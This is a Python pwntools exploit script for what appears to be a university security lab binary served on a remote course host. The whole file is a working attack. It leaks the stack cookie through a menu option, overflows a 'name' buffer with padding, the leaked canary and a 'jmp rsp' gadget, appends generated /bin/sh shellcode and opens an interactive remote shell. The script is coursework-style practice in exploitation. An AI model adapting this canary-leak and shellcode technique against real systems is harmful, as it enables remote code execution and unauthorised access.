from pwn import *

# Set  OS context architecture
context.arch = "amd64"

# Initialize 24 padding character bytes needed to overflow upto the stack cookie 
PADDING1 = (b'A'*24)
print("The cookie prefix padding bytes are: ", PADDING1)
print("")

# Get the stack cookie
#p = gdb.debug("./lab3-1.bin")  # run exploit against binary locally with process attached to gdb
#p = process("./lab3-1.bin")   # run exploit against binary locally without attacking the process to gdb 
p = remote("csc748.hostbin.org", 7031) # run the exploit against a remote process
p.readuntil("Exit\n").decode('utf-8')
p.sendline(b'3')
p.readuntil("number:")
p.sendline(b'7')
COOKIE = p.readuntil("\n").decode('utf-8')
COOKIE = COOKIE[15:]
print("The leaked cookie bytes in integer format are: ", COOKIE)
print("")
print("The leaked cookie bytes in hexdecimal format are: ", hex(int(COOKIE)))
print("")
print("The leaked cookie bytes in  packed 64 format are: ", p64(int(COOKIE)))
print("")

# Initialize 8 padding characters bytes needed to fill the oveflow RBP
PADDING2 = (b'B'*8)
print("The cookie suffix padding bytes are: ", PADDING2) 
print("")

# Initialize the ROP gadget to jump to the shellcode
JMP_RSP = 0x401400
print("The ROP gadget instruction 'jmp rsp;' is at binary code address: 0x{:X}".format(JMP_RSP))
print("")
print("The ROP gadget instruction 'jmp rsp;' in packed 64 format is: ", p64(JMP_RSP))
print("")

# Shell call code
SHELLCODE = asm(shellcraft.amd64.linux.sh())
print("The shellcode bytes are:", (SHELLCODE))
print("")

# Overflow the stack and exploit via the 'name' character array
p.readuntil("Exit\n").decode('utf-8')
p.sendline(b'2')
p.readuntil("name:")
payload = (PADDING1 + p64(int(COOKIE)) + PADDING2 + p64(JMP_RSP) + SHELLCODE)
print("The full payload bytes are: ", payload)
print("")
p.sendline(payload)
p.readuntil("Exit\n").decode('utf-8')
p.sendline(b'4')

# Switcht to interactive session after gaining shell
p.interactive()
